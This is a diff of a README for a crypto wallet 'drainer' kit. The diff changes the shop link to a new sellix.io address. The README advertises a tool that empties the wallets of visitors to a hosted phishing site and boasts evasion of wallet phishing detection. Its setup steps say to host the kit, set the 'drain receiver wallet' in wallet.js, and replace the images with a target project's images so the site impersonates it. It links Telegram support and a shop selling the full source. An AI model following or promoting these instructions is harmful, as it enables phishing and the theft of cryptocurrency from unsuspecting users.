@@ -1,4 +1,4 @@
-# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE https://autodrainer.sellix.io/*
+# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE https://unidrainer.sellix.io/*
 ### 📩 Like **all Drainers** you need to host to make it work (recommended: Hostinger, Netlify, Vercel, Github...)
 
 ---
@@ -18,7 +18,7 @@
 - [x] Anti Phantom Phishing Detections
 
 ## ` 📂 Setup Guide `
-# **🧙🏼 NOTE!** *WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE* https://autodrainer.sellix.io/
+# **🧙🏼 NOTE!** *WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE* https://unidrainer.sellix.io/
 You need to edit the __**wallet.js**__ file to change the Drain receiver wallet.
 
 - Open all images folders and put your project images, but rename name as it was before.
@@ -30,7 +30,7 @@ To get instant support, contact us on [Telegram](https://t.me/soleaterdev)
 ## ` 🌊 Socials `
 
 - Telegram: https://t.me/soleaterdev
-- Shop: https://autodrainer.sellix.io/
+- Shop: https://unidrainer.sellix.io/
 - Group: https://t.me/opdrain
 
 ##### Please ⭐ the repo to support this project & follow next updates
